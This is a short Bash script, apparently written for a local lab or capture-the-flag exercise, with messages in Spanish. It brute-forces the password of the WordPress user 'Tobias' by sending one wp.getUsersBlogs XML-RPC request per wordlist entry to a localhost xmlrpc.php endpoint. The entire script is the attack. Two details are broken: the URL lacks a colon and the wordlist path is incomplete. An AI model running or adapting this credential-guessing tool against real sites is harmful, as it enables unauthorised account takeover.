#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# Ctrl + C
trap ctrl_c SIGINT

function createXML(){
  password=$1
  
  xmlFile="""
   <?xml version="1.0" encoding="UTF-8"?>
   <methodCall> 
   <methodName>wp.getUsersBlogs</methodName> 
   <params> 
   <param><value>Tobias</value></param> 
   <param><value>$password</value></param> 
   </params> 
   </methodCall>"""
   
   echo $xmlFile > file.xml
   
   response=$(curl -s -X POST "http//localhost:31337/xmlrpc.php" -d@file.xml)
   
   if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "\n[+] La contraseña para el usuario Tobias es $password"
    exit 0
   fi
}

cat /usr/share/wordlists/.txt | while read password; do
  createXML $password
done
